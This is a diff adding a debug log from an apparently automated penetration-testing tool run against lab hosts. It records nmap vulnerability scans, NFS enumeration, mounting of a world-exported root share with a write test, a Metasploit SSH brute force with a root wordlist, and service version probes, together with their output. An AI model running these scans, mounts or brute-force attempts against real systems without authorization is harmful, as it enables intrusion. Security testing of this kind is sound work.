@@ -1,0 +1,952 @@
+2017-02-06 16:40:05,438 - Commands Logger - DEBUG - Command Logger --->Command id --> msrpc_1  Message --> :In method SingleLineCommands_Timeout()
+2017-02-06 16:40:05,439 - Commands Logger - DEBUG - Command Logger --->Command id --> msrpc_1  Message --> :Thread started --with command nmap --script=smb-check-vulns.nse -p 135 10.0.1.39
+2017-02-06 16:40:17,315 - Commands Logger - DEBUG - Command Logger --->Command id --> msrpc_1  Message --> :Thread finished
+2017-02-06 16:40:17,316 - Commands Logger - DEBUG - Command Logger --->Command id --> msrpc_1  Message --> :Saving details :
+2017-02-06 16:40:17,321 - Commands Logger - DEBUG - Command id is ->msrpc_1
+2017-02-06 16:40:17,321 - Commands Logger - DEBUG - commands are : [u'nmap --script=smb-check-vulns.nse -p 135 10.0.1.39', '\nEnd']
+2017-02-06 16:40:17,321 - Commands Logger - DEBUG - My var : '$.Entries."msrpc_1"'
+2017-02-06 16:40:17,321 - Commands Logger - DEBUG - Result --> : Command Executed :nmap --script=smb-check-vulns.nse -p 135 10.0.1.39
+
+Result
+Starting Nmap 7.12 ( https://nmap.org ) at 2017-02-06 16:40 UTC
+Nmap scan report for 10.0.1.39
+Host is up (0.0017s latency).
+PORT    STATE SERVICE
+135/tcp open  msrpc
+
+Host script results:
+|_smb-check-vulns: ERROR: Script execution failed (use -d to debug)
+
+Nmap done: 1 IP address (1 host up) scanned in 11.84 seconds
+
+
+
+2017-02-06 16:40:17,331 - Commands Logger - DEBUG - Finished!!!
+2017-02-06 16:40:17,408 - Commands Logger - DEBUG - Command Logger --->Command id --> msrpc_2  Message --> :In method SingleLineCommands_Timeout()
+2017-02-06 16:40:17,408 - Commands Logger - DEBUG - Command Logger --->Command id --> msrpc_2  Message --> :Thread started --with command nmap --script=msrpc-enum.nse -p 135 10.0.1.39
+2017-02-06 16:40:29,185 - Commands Logger - DEBUG - Command Logger --->Command id --> msrpc_2  Message --> :Thread finished
+2017-02-06 16:40:29,186 - Commands Logger - DEBUG - Command Logger --->Command id --> msrpc_2  Message --> :Saving details :
+2017-02-06 16:40:29,188 - Commands Logger - DEBUG - Command id is ->msrpc_2
+2017-02-06 16:40:29,188 - Commands Logger - DEBUG - commands are : [u'nmap --script=msrpc-enum.nse -p 135 10.0.1.39', '\nEnd']
+2017-02-06 16:40:29,188 - Commands Logger - DEBUG - My var : '$.Entries."msrpc_2"'
+2017-02-06 16:40:29,188 - Commands Logger - DEBUG - Result --> : Command Executed :nmap --script=msrpc-enum.nse -p 135 10.0.1.39
+
+Result
+Starting Nmap 7.12 ( https://nmap.org ) at 2017-02-06 16:40 UTC
+Nmap scan report for 10.0.1.39
+Host is up (0.0017s latency).
+PORT    STATE SERVICE
+135/tcp open  msrpc
+
+Nmap done: 1 IP address (1 host up) scanned in 11.75 seconds
+
+
+
+2017-02-06 16:40:29,208 - Commands Logger - DEBUG - Finished!!!
+2017-02-06 16:40:29,292 - Commands Logger - DEBUG - Command Logger --->Command id --> telnet_1  Message --> :In method SingleLineCommands_Timeout()
+2017-02-06 16:40:29,296 - Commands Logger - DEBUG - Command Logger --->Command id --> telnet_1  Message --> :Thread started --with command nmap -p 53 192.168.182.128 --script telnet-encryption
+2017-02-06 16:40:41,084 - Commands Logger - DEBUG - Command Logger --->Command id --> telnet_1  Message --> :Thread finished
+2017-02-06 16:40:41,084 - Commands Logger - DEBUG - Command Logger --->Command id --> telnet_1  Message --> :Saving details :
+2017-02-06 16:40:41,086 - Commands Logger - DEBUG - Command id is ->telnet_1
+2017-02-06 16:40:41,086 - Commands Logger - DEBUG - commands are : [u'nmap -p 53 192.168.182.128 --script telnet-encryption', '\nEnd']
+2017-02-06 16:40:41,086 - Commands Logger - DEBUG - My var : '$.Entries."telnet_1"'
+2017-02-06 16:40:41,086 - Commands Logger - DEBUG - Result --> : Command Executed :nmap -p 53 192.168.182.128 --script telnet-encryption
+
+Result
+Starting Nmap 7.12 ( https://nmap.org ) at 2017-02-06 16:40 UTC
+Nmap scan report for 192.168.182.128
+Host is up (0.00043s latency).
+PORT   STATE SERVICE
+53/tcp open  domain
+
+Nmap done: 1 IP address (1 host up) scanned in 11.77 seconds
+
+
+
+2017-02-06 16:40:41,101 - Commands Logger - DEBUG - Finished!!!
+2017-02-06 16:40:41,139 - Commands Logger - DEBUG - Command Logger --->Command id --> telnet_1  Message --> :In method SingleLineCommands_Timeout()
+2017-02-06 16:40:41,140 - Commands Logger - DEBUG - Command Logger --->Command id --> telnet_1  Message --> :Thread started --with command nmap -p 23 192.168.182.128 --script telnet-encryption
+2017-02-06 16:40:53,141 - Commands Logger - DEBUG - Command Logger --->Command id --> telnet_1  Message --> :Thread finished
+2017-02-06 16:40:53,141 - Commands Logger - DEBUG - Command Logger --->Command id --> telnet_1  Message --> :Saving details :
+2017-02-06 16:40:53,148 - Commands Logger - DEBUG - Command id is ->telnet_1
+2017-02-06 16:40:53,148 - Commands Logger - DEBUG - commands are : [u'nmap -p 23 192.168.182.128 --script telnet-encryption', '\nEnd']
+2017-02-06 16:40:53,148 - Commands Logger - DEBUG - My var : '$.Entries."telnet_1"'
+2017-02-06 16:40:53,149 - Commands Logger - DEBUG - Result --> : Command Executed :nmap -p 23 192.168.182.128 --script telnet-encryption
+
+Result
+Starting Nmap 7.12 ( https://nmap.org ) at 2017-02-06 16:40 UTC
+Nmap scan report for 192.168.182.128
+Host is up (0.00064s latency).
+PORT   STATE SERVICE
+23/tcp open  telnet
+| telnet-encryption: 
+|_  Telnet server does not support encryption
+
+Nmap done: 1 IP address (1 host up) scanned in 11.98 seconds
+
+
+
+2017-02-06 16:40:53,164 - Commands Logger - DEBUG - Finished!!!
+2017-02-06 16:40:53,235 - Commands Logger - DEBUG - Command Logger --->Command id --> nfs_1  Message --> :In method SingleLineCommands_Timeout()
+2017-02-06 16:40:53,236 - Commands Logger - DEBUG - Command Logger --->Command id --> nfs_1  Message --> :Thread started --with command rpcinfo -p  192.168.182.128
+2017-02-06 16:40:53,590 - Commands Logger - DEBUG - Command Logger --->Command id --> nfs_1  Message --> :Thread finished
+2017-02-06 16:40:53,591 - Commands Logger - DEBUG - Command Logger --->Command id --> nfs_1  Message --> :Saving details :
+2017-02-06 16:40:53,593 - Commands Logger - DEBUG - Command id is ->nfs_1
+2017-02-06 16:40:53,593 - Commands Logger - DEBUG - commands are : [u'rpcinfo -p  192.168.182.128', '\nEnd']
+2017-02-06 16:40:53,593 - Commands Logger - DEBUG - My var : '$.Entries."nfs_1"'
+2017-02-06 16:40:53,593 - Commands Logger - DEBUG - Result --> : Command Executed :rpcinfo -p  192.168.182.128
+
+Result   program vers proto   port  service
+    100000    2   tcp    111  portmapper
+    100000    2   udp    111  portmapper
+    100024    1   udp  37594  status
+    100024    1   tcp  35506  status
+    100003    2   udp   2049  nfs
+    100003    3   udp   2049  nfs
+    100003    4   udp   2049  nfs
+    100021    1   udp  41320  nlockmgr
+    100021    3   udp  41320  nlockmgr
+    100021    4   udp  41320  nlockmgr
+    100003    2   tcp   2049  nfs
+    100003    3   tcp   2049  nfs
+    100003    4   tcp   2049  nfs
+    100021    1   tcp  51227  nlockmgr
+    100021    3   tcp  51227  nlockmgr
+    100021    4   tcp  51227  nlockmgr
+    100005    1   udp  51740  mountd
+    100005    1   tcp  46785  mountd
+    100005    2   udp  51740  mountd
+    100005    2   tcp  46785  mountd
+    100005    3   udp  51740  mountd
+    100005    3   tcp  46785  mountd
+
+
+
+2017-02-06 16:40:53,605 - Commands Logger - DEBUG - Finished!!!
+2017-02-06 16:40:53,639 - Commands Logger - DEBUG - Command Logger --->Command id --> nfs_2  Message --> :In method SingleLineCommands_Timeout()
+2017-02-06 16:40:53,640 - Commands Logger - DEBUG - Command Logger --->Command id --> nfs_2  Message --> :Thread started --with command perl Scripts/nfsping.pl 192.168.182.128
+2017-02-06 16:40:58,753 - Commands Logger - DEBUG - Command Logger --->Command id --> nfs_2  Message --> :Thread finished
+2017-02-06 16:40:58,753 - Commands Logger - DEBUG - Command Logger --->Command id --> nfs_2  Message --> :Saving details :
+2017-02-06 16:40:58,757 - Commands Logger - DEBUG - Command id is ->nfs_2
+2017-02-06 16:40:58,757 - Commands Logger - DEBUG - commands are : [u'perl Scripts/nfsping.pl 192.168.182.128', '\nEnd']
+2017-02-06 16:40:58,757 - Commands Logger - DEBUG - My var : '$.Entries."nfs_2"'
+2017-02-06 16:40:58,757 - Commands Logger - DEBUG - Result --> : Command Executed :perl Scripts/nfsping.pl 192.168.182.128
+
+Result
+Got response from 192.168.182.128
+
+              :: scanning 1/1
+:: waiting for responses...
+
+
+2017-02-06 16:40:58,768 - Commands Logger - DEBUG - Finished!!!
+2017-02-06 16:40:58,819 - Commands Logger - DEBUG - Command Logger --->Command id --> nfs_3  Message --> :In method SingleLineCommands_Timeout()
+2017-02-06 16:40:58,820 - Commands Logger - DEBUG - Command Logger --->Command id --> nfs_3  Message --> :Thread started --with command showmount -e 192.168.182.128
+2017-02-06 16:40:58,859 - Commands Logger - DEBUG - Command Logger --->Command id --> nfs_3  Message --> :Thread finished
+2017-02-06 16:40:58,860 - Commands Logger - DEBUG - Command Logger --->Command id --> nfs_3  Message --> :Saving details :
+2017-02-06 16:40:58,861 - Commands Logger - DEBUG - Command id is ->nfs_3
+2017-02-06 16:40:58,862 - Commands Logger - DEBUG - commands are : [u'showmount -e 192.168.182.128', '\nEnd']
+2017-02-06 16:40:58,862 - Commands Logger - DEBUG - My var : '$.Entries."nfs_3"'
+2017-02-06 16:40:58,862 - Commands Logger - DEBUG - Result --> : Command Executed :showmount -e 192.168.182.128
+
+ResultExport list for 192.168.182.128:
+/ *
+
+
+
+2017-02-06 16:40:58,872 - Commands Logger - DEBUG - Finished!!!
+2017-02-06 16:40:58,919 - Commands Logger - DEBUG - Command Logger --->Command id --> nfs_4  Message --> :
+
+Starting Mount  all retive
+
+
+2017-02-06 16:40:58,942 - Commands Logger - DEBUG - Command Logger --->Command id --> nfs_4  Message --> :<class 'pexpect.exceptions.EOF'>
+2017-02-06 16:40:58,942 - Commands Logger - DEBUG - Command Logger --->Command id --> nfs_4  Message --> :2
+2017-02-06 16:41:03,051 - Commands Logger - DEBUG - Command Logger --->Command id --> nfs_4  Message --> :<class 'pexpect.exceptions.EOF'>
+2017-02-06 16:41:07,156 - Commands Logger - DEBUG - Command Logger --->Command id --> nfs_4  Message --> :<class 'pexpect.exceptions.EOF'>
+2017-02-06 16:41:11,264 - Commands Logger - DEBUG - Command Logger --->Command id --> nfs_4  Message --> :<class 'pexpect.exceptions.EOF'>
+2017-02-06 16:41:15,371 - Commands Logger - DEBUG - Command Logger --->Command id --> nfs_4  Message --> :<class 'pexpect.exceptions.EOF'>
+2017-02-06 16:41:19,480 - Commands Logger - DEBUG - Command Logger --->Command id --> nfs_4  Message --> :<class 'pexpect.exceptions.EOF'>
+2017-02-06 16:41:19,481 - Commands Logger - DEBUG - Command Logger --->Command id --> nfs_4  Message --> :Closing Child now !!
+2017-02-06 16:41:19,582 - Commands Logger - DEBUG - Command Logger --->Command id --> nfs_4  Message --> :Saving details :
+2017-02-06 16:41:19,584 - Commands Logger - DEBUG - Command id is ->nfs_4
+2017-02-06 16:41:19,584 - Commands Logger - DEBUG - commands are : ['>mount -t nfs 192.168.182.128:/ /temp\n', "><class 'pexpect.exceptions.EOF'>", u'cd /temp\n', "<class 'pexpect.exceptions.EOF'>", u'ls\n', "<class 'pexpect.exceptions.EOF'>", u'mkdir test_directory\n', "<class 'pexpect.exceptions.EOF'>", u'cd ..\n', "<class 'pexpect.exceptions.EOF'>", u'umount /temp/\n', "<class 'pexpect.exceptions.EOF'>"]
+2017-02-06 16:41:19,584 - Commands Logger - DEBUG - My var : '$.Entries."nfs_4"'
+2017-02-06 16:41:19,584 - Commands Logger - DEBUG - Result --> : 
+Command Executed :>mount -t nfs 192.168.182.128:/ /temp
+Result:
+<class 'pexpect.exceptions.EOF'>
+2017-02-06 16:41:19,681 - Commands Logger - DEBUG - Finished!!!
+2017-02-06 16:41:19,715 - Commands Logger - DEBUG - Command Logger --->Command id --> ssh_1  Message --> :Inside command_meta
+2017-02-06 16:41:36,653 - Commands Logger - DEBUG - Command Logger --->Command id --> ssh_1  Message --> :[4mmsf[0m [0m> 
+2017-02-06 16:41:36,653 - Commands Logger - DEBUG - Command Logger --->Command id --> ssh_1  Message --> :0
+2017-02-06 16:41:39,757 - Commands Logger - DEBUG - Command Logger --->Command id --> ssh_1  Message --> :workspace -a Metasploit_automation
+[0m[1m[34m[*][0m Added workspace: Metasploit_automation
+[4mmsf[0m [0m> 
+2017-02-06 16:41:42,861 - Commands Logger - DEBUG - Command Logger --->Command id --> ssh_1  Message --> :set THREADS 1
+[0mTHREADS => 1
+[4mmsf[0m [0m> 
+2017-02-06 16:41:45,966 - Commands Logger - DEBUG - Command Logger --->Command id --> ssh_1  Message --> :workspace Metasploit_automation
+[0m[1m[34m[*][0m Workspace: Metasploit_automation
+[4mmsf[0m [0m> 
+2017-02-06 16:41:49,070 - Commands Logger - DEBUG - Command Logger --->Command id --> ssh_1  Message --> :use auxiliary/scanner/ssh/ssh_login
+[0m[4mmsf[0m auxiliary([1m[31mssh_login[0m) [0m> 
+2017-02-06 16:41:52,177 - Commands Logger - DEBUG - Command Logger --->Command id --> ssh_1  Message --> :set RHOSTS 192.168.182.128
+[0mRHOSTS => 192.168.182.128
+[4mmsf[0m auxiliary([1m[31mssh_login[0m) [0m> 
+2017-02-06 16:41:55,284 - Commands Logger - DEBUG - Command Logger --->Command id --> ssh_1  Message --> :set USERPASS_FILE /usr/share/metasploit-framework/dat a/wordlists/root_userpass.txt
+[0mUSERPASS_FILE => /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
+[4mmsf[0m auxiliary([1m[31mssh_login[0m) [0m> 
+2017-02-06 16:41:58,395 - Commands Logger - DEBUG - Command Logger --->Command id --> ssh_1  Message --> :set VERBOSE false
+[0mVERBOSE => false
+[4mmsf[0m auxiliary([1m[31mssh_login[0m) [0m> 
+2017-02-06 16:41:58,396 - Commands Logger - DEBUG - Command Logger --->Command id --> ssh_1  Message --> :
+
+Everything Fine till now-->Launching run command
+
+
+2017-02-06 16:44:49,829 - Commands Logger - DEBUG - Command Logger --->Command id --> ssh_1  Message --> :
+
+Module Execution completed
+
+
+2017-02-06 16:44:49,830 - Commands Logger - DEBUG - Command Logger --->Command id --> ssh_1  Message --> :Before : 
+After : 
+run
+[0m
+[1m[34m[*][0m SSH - Starting bruteforce
+[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf[0m auxiliary([1m[31mssh_login[0m) [0m> 
+2017-02-06 16:44:49,830 - Commands Logger - DEBUG - Command Logger --->Command id --> ssh_1  Message --> :
+
+Now exiting !!!
+
+
+2017-02-06 16:44:49,830 - Commands Logger - DEBUG - Command Logger --->Command id --> ssh_1  Message --> :
+Exiting  from msfconsole !!!
+
+2017-02-06 16:44:51,933 - Commands Logger - DEBUG - Command Logger --->Command id --> ssh_1  Message --> :Exited from msfconsole !!!
+2017-02-06 16:44:51,933 - Commands Logger - DEBUG - Command Logger --->Command id --> ssh_1  Message --> :Before : 
+exit
+[0mAfter : 
+<class 'pexpect.exceptions.EOF'>
+2017-02-06 16:44:51,933 - Commands Logger - DEBUG - Command Logger --->Command id --> ssh_1  Message --> :Closing the child pipe !!!
+2017-02-06 16:44:52,034 - Commands Logger - DEBUG - Command Logger --->Command id --> ssh_1  Message --> :Saving details :
+2017-02-06 16:44:52,036 - Commands Logger - DEBUG - Command id is ->ssh_1
+2017-02-06 16:44:52,036 - Commands Logger - DEBUG - commands are : ['>msfconsole', '\x1b[4mmsf\x1b[0m \x1b[0m> ', u'workspace -a Metasploit_automation\n', 'workspace -a Metasploit_automation\r\r\n\x1b[0m\x1b[1m\x1b[34m[*]\x1b[0m Added workspace: Metasploit_automation\r\n\x1b[4mmsf\x1b[0m \x1b[0m> \n', u'set THREADS 1\n', 'set THREADS 1\r\r\n\x1b[0mTHREADS => 1\r\n\x1b[4mmsf\x1b[0m \x1b[0m> \n', u'workspace Metasploit_automation\n', 'workspace Metasploit_automation\r\r\n\x1b[0m\x1b[1m\x1b[34m[*]\x1b[0m Workspace: Metasploit_automation\r\n\x1b[4mmsf\x1b[0m \x1b[0m> \n', u'use auxiliary/scanner/ssh/ssh_login\n', 'use auxiliary/scanner/ssh/ssh_login\r\r\n\x1b[0m\x1b[4mmsf\x1b[0m auxiliary(\x1b[1m\x1b[31mssh_login\x1b[0m) \x1b[0m> \n', u'set RHOSTS 192.168.182.128\n', 'set RHOSTS 192.168.182.128\r\r\n\x1b[0mRHOSTS => 192.168.182.128\r\n\x1b[4mmsf\x1b[0m auxiliary(\x1b[1m\x1b[31mssh_login\x1b[0m) \x1b[0m> \n', u'set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt\n', 'set USERPASS_FILE /usr/share/metasploit-framework/dat \ra/wordlists/root_userpass.txt\r\r\n\x1b[0mUSERPASS_FILE => /usr/share/metasploit-framework/data/wordlists/root_userpass.txt\r\n\x1b[4mmsf\x1b[0m auxiliary(\x1b[1m\x1b[31mssh_login\x1b[0m) \x1b[0m> \n', u'set VERBOSE false\n', 'set VERBOSE false\r\r\n\x1b[0mVERBOSE => false\r\n\x1b[4mmsf\x1b[0m auxiliary(\x1b[1m\x1b[31mssh_login\x1b[0m) \x1b[0m> \n', '>run', 'run\r\r\n\x1b[0m\r\n\x1b[1m\x1b[34m[*]\x1b[0m SSH - Starting bruteforce\r\n\x1b[1m\x1b[34m[*]\x1b[0m Scanned 1 of 1 hosts (100% complete)\r\n\x1b[1m\x1b[34m[*]\x1b[0m Auxiliary module execution completed\r\n\x1b[4mmsf\x1b[0m auxiliary(\x1b[1m\x1b[31mssh_login\x1b[0m) \x1b[0m> \n']
+2017-02-06 16:44:52,037 - Commands Logger - DEBUG - My var : '$.Entries."ssh_1"'
+2017-02-06 16:44:52,037 - Commands Logger - DEBUG - Result --> : 
+Command Executed :>msfconsole
+Result :
+run
+[0m
+[1m[34m[*][0m SSH - Starting bruteforce
+[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf[0m auxiliary([1m[31mssh_login[0m) [0m> 
+2017-02-06 16:44:52,054 - Commands Logger - DEBUG - Finished!!!
+2017-02-06 16:44:52,087 - Commands Logger - DEBUG - Command Logger --->Command id --> ssh_2  Message --> :In method SingleLineCommands_Timeout()
+2017-02-06 16:44:52,088 - Commands Logger - DEBUG - Command Logger --->Command id --> ssh_2  Message --> :Thread started --with command java -cp Scripts/'ssh-cipher-check.jar' SSHCipherCheck 192.168.182.128 22
+2017-02-06 16:44:54,339 - Commands Logger - DEBUG - Command Logger --->Command id --> ssh_2  Message --> :Thread finished
+2017-02-06 16:44:54,339 - Commands Logger - DEBUG - Command Logger --->Command id --> ssh_2  Message --> :Saving details :
+2017-02-06 16:44:54,340 - Commands Logger - DEBUG - Command id is ->ssh_2
+2017-02-06 16:44:54,341 - Commands Logger - DEBUG - commands are : [u"java -cp Scripts/'ssh-cipher-check.jar' SSHCipherCheck 192.168.182.128 22", '\nEnd']
+2017-02-06 16:44:54,341 - Commands Logger - DEBUG - My var : '$.Entries."ssh_2"'
+2017-02-06 16:44:54,341 - Commands Logger - DEBUG - Result --> : Command Executed :java -cp Scripts/'ssh-cipher-check.jar' SSHCipherCheck 192.168.182.128 22
+
+ResultSSH Version: 2.0
+SSH Library: OpenSSH_4.7p1 Debian
+
+
+Key Exchange Algorithms: diffie-hellman-group-exchange-sha256,diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
+Server Host Key Algorithms: ssh-rsa,ssh-dss
+Encryption Algorithms Client to Server: aes128-cbc,3des-cbc,blowfish-cbc,cast128-cbc,arcfour128,arcfour256,arcfour,aes192-cbc,aes256-cbc,rijndael-cbc@lysator.liu.se,aes128-ctr,aes192-ctr,aes256-ctr
+Encryption Algorithms Server to Client: aes128-cbc,3des-cbc,blowfish-cbc,cast128-cbc,arcfour128,arcfour256,arcfour,aes192-cbc,aes256-cbc,rijndael-cbc@lysator.liu.se,aes128-ctr,aes192-ctr,aes256-ctr
+Mac Algorithms Client to Server: hmac-md5,hmac-sha1,umac-64@openssh.com,hmac-ripemd160,hmac-ripemd160@openssh.com,hmac-sha1-96,hmac-md5-96
+Mac Algorithms Server to Client: hmac-md5,hmac-sha1,umac-64@openssh.com,hmac-ripemd160,hmac-ripemd160@openssh.com,hmac-sha1-96,hmac-md5-96
+Compression Algorithms Client to Server: none,zlib@openssh.com
+Compression Algorithms Server to Client: none,zlib@openssh.com
+
+
+
+2017-02-06 16:44:54,391 - Commands Logger - DEBUG - Finished!!!
+2017-02-06 16:44:54,427 - Commands Logger - DEBUG - Command Logger --->Command id --> ssh_3  Message --> :In method SingleLineCommands_Timeout()
+2017-02-06 16:44:54,428 - Commands Logger - DEBUG - Command Logger --->Command id --> ssh_3  Message --> :Thread started --with command nc -zvn 192.168.182.128 22
+2017-02-06 16:44:54,441 - Commands Logger - DEBUG - Command Logger --->Command id --> ssh_3  Message --> :Thread finished
+2017-02-06 16:44:54,442 - Commands Logger - DEBUG - Command Logger --->Command id --> ssh_3  Message --> :Saving details :
+2017-02-06 16:44:54,443 - Commands Logger - DEBUG - Command id is ->ssh_3
+2017-02-06 16:44:54,443 - Commands Logger - DEBUG - commands are : [u'nc -zvn 192.168.182.128 22', '\nEnd']
+2017-02-06 16:44:54,444 - Commands Logger - DEBUG - My var : '$.Entries."ssh_3"'
+2017-02-06 16:44:54,444 - Commands Logger - DEBUG - Result --> : Command Executed :nc -zvn 192.168.182.128 22
+
+Result
+(UNKNOWN) [192.168.182.128] 22 (ssh) open
+
+
+2017-02-06 16:44:54,458 - Commands Logger - DEBUG - Finished!!!
+2017-02-06 16:44:54,492 - Commands Logger - DEBUG - Command Logger --->Command id --> ssh_4  Message --> :
+
+Starting ssh--INteractive
+
+
+2017-02-06 16:45:09,712 - Commands Logger - DEBUG - Command Logger --->Command id --> ssh_4  Message --> :Permission Denied at inception for root--Good 
+2017-02-06 16:45:09,712 - Commands Logger - DEBUG - Command Logger --->Command id --> ssh_4  Message --> :Before : 
+After : 
+
+Permission denied, please try again.
+2017-02-06 16:45:09,712 - Commands Logger - DEBUG - Command Logger --->Command id --> ssh_4  Message --> :Closing Child now !!
+2017-02-06 16:45:09,814 - Commands Logger - DEBUG - Command Logger --->Command id --> ssh_4  Message --> :Saving details :
+2017-02-06 16:45:09,816 - Commands Logger - DEBUG - Command id is ->ssh_4
+2017-02-06 16:45:09,816 - Commands Logger - DEBUG - commands are : [u'ssh root@192.168.182.128\n', 'root\n', '\r\nPermission denied, please try again.\r\n']
+2017-02-06 16:45:09,817 - Commands Logger - DEBUG - My var : '$.Entries."ssh_4"'
+2017-02-06 16:45:09,817 - Commands Logger - DEBUG - Result --> : Command Executed :ssh root@192.168.182.128
+
+
+Result:
+
+Permission denied, please try again.
+
+2017-02-06 16:45:09,831 - Commands Logger - DEBUG - Finished!!!
+2017-02-06 16:45:09,859 - Commands Logger - DEBUG - Command Logger --->Command id --> ssh_5  Message --> :In method SingleLineCommands_Timeout()
+2017-02-06 16:45:09,860 - Commands Logger - DEBUG - Command Logger --->Command id --> ssh_5  Message --> :Thread started --with command nmap -sV --script=ssh2-enum-algos.nse -p 22 192.168.182.128
+2017-02-06 16:45:22,571 - Commands Logger - DEBUG - Command Logger --->Command id --> ssh_5  Message --> :Thread finished
+2017-02-06 16:45:22,572 - Commands Logger - DEBUG - Command Logger --->Command id --> ssh_5  Message --> :Saving details :
+2017-02-06 16:45:22,574 - Commands Logger - DEBUG - Command id is ->ssh_5
+2017-02-06 16:45:22,574 - Commands Logger - DEBUG - commands are : [u'nmap -sV --script=ssh2-enum-algos.nse -p 22 192.168.182.128', '\nEnd']
+2017-02-06 16:45:22,574 - Commands Logger - DEBUG - My var : '$.Entries."ssh_5"'
+2017-02-06 16:45:22,574 - Commands Logger - DEBUG - Result --> : Command Executed :nmap -sV --script=ssh2-enum-algos.nse -p 22 192.168.182.128
+
+Result
+Starting Nmap 7.12 ( https://nmap.org ) at 2017-02-06 16:45 UTC
+Nmap scan report for 192.168.182.128
+Host is up (0.00043s latency).
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+| ssh2-enum-algos: 
+|   kex_algorithms: (4)
+|       diffie-hellman-group-exchange-sha256
+|       diffie-hellman-group-exchange-sha1
+|       diffie-hellman-group14-sha1
+|       diffie-hellman-group1-sha1
+|   server_host_key_algorithms: (2)
+|       ssh-rsa
+|       ssh-dss
+|   encryption_algorithms: (13)
+|       aes128-cbc
+|       3des-cbc
+|       blowfish-cbc
+|       cast128-cbc
+|       arcfour128
+|       arcfour256
+|       arcfour
+|       aes192-cbc
+|       aes256-cbc
+|       rijndael-cbc@lysator.liu.se
+|       aes128-ctr
+|       aes192-ctr
+|       aes256-ctr
+|   mac_algorithms: (7)
+|       hmac-md5
+|       hmac-sha1
+|       umac-64@openssh.com
+|       hmac-ripemd160
+|       hmac-ripemd160@openssh.com
+|       hmac-sha1-96
+|       hmac-md5-96
+|   compression_algorithms: (2)
+|       none
+|_      zlib@openssh.com
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.68 seconds
+
+
+
+2017-02-06 16:45:22,644 - Commands Logger - DEBUG - Finished!!!
+2017-02-06 16:45:22,707 - Commands Logger - DEBUG - Command Logger --->Command id --> ssh_6  Message --> :In method SingleLineCommands_Timeout()
+2017-02-06 16:45:22,708 - Commands Logger - DEBUG - Command Logger --->Command id --> ssh_6  Message --> :Thread started --with command nmap -sV --script=banner.nse -p 22 192.168.182.128
+2017-02-06 16:45:43,115 - Commands Logger - DEBUG - Command Logger --->Command id --> ssh_6  Message --> :Thread finished
+2017-02-06 16:45:43,115 - Commands Logger - DEBUG - Command Logger --->Command id --> ssh_6  Message --> :Saving details :
+2017-02-06 16:45:43,118 - Commands Logger - DEBUG - Command id is ->ssh_6
+2017-02-06 16:45:43,118 - Commands Logger - DEBUG - commands are : [u'nmap -sV --script=banner.nse -p 22 192.168.182.128', '\nEnd']
+2017-02-06 16:45:43,118 - Commands Logger - DEBUG - My var : '$.Entries."ssh_6"'
+2017-02-06 16:45:43,118 - Commands Logger - DEBUG - Result --> : Command Executed :nmap -sV --script=banner.nse -p 22 192.168.182.128
+
+Result
+Starting Nmap 7.12 ( https://nmap.org ) at 2017-02-06 16:45 UTC
+Nmap scan report for 192.168.182.128
+Host is up (0.00043s latency).
+PORT   STATE SERVICE    VERSION
+22/tcp open  tcpwrapped
+|_banner: SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 20.39 seconds
+
+
+
+2017-02-06 16:45:43,131 - Commands Logger - DEBUG - Finished!!!
+2017-02-06 16:45:43,167 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_1  Message --> :Inside command_meta
+2017-02-06 16:45:54,588 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_1  Message --> :[4mmsf[0m [0m> 
+2017-02-06 16:45:54,588 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_1  Message --> :0
+2017-02-06 16:45:57,694 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_1  Message --> :workspace -a Metasploit_automation
+[0m[1m[34m[*][0m Added workspace: Metasploit_automation
+[4mmsf[0m [0m> 
+2017-02-06 16:46:00,798 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_1  Message --> :workspace Metasploit_automation
+[0m[1m[34m[*][0m Workspace: Metasploit_automation
+[4mmsf[0m [0m> 
+2017-02-06 16:46:03,901 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_1  Message --> :use auxiliary/scanner/mysql/mysql_version
+[0m[4mmsf[0m auxiliary([1m[31mmysql_version[0m) [0m> 
+2017-02-06 16:46:07,005 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_1  Message --> :set RHOSTS 192.168.182.128
+[0mRHOSTS => 192.168.182.128
+[4mmsf[0m auxiliary([1m[31mmysql_version[0m) [0m> 
+2017-02-06 16:46:10,110 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_1  Message --> :set rport 3306
+[0mrport => 3306
+[4mmsf[0m auxiliary([1m[31mmysql_version[0m) [0m> 
+2017-02-06 16:46:13,216 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_1  Message --> :set threads 1
+[0mthreads => 1
+[4mmsf[0m auxiliary([1m[31mmysql_version[0m) [0m> 
+2017-02-06 16:46:13,217 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_1  Message --> :
+
+Everything Fine till now-->Launching run command
+
+
+2017-02-06 16:46:18,327 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_1  Message --> :
+
+Module Execution completed
+
+
+2017-02-06 16:46:18,327 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_1  Message --> :Before : 
+After : 
+run
+[0m
+[1m[34m[*][0m 192.168.182.128:3306  - 192.168.182.128:3306 is running MySQL 5.0.51a-3ubuntu5 (protocol 10)
+[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf[0m auxiliary([1m[31mmysql_version[0m) [0m> 
